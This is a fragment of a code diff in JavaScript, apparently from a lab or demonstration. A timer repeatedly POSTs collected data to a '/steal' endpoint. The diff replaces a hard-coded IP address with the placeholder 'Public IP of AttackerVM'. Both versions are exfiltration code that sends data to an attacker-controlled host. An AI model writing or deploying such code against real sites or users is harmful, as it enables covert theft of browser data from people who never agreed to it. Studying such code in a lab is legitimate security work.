@@ -27,7 +27,7 @@ setInterval(function () {
     time: new Date().toISOString()
   };
 
-  fetch("http://20.197.10.26/steal", {
+  fetch("http://Public IP of AttackerVM/steal", {
     method: "POST",
     headers: {
       "Content-Type": "application/json"
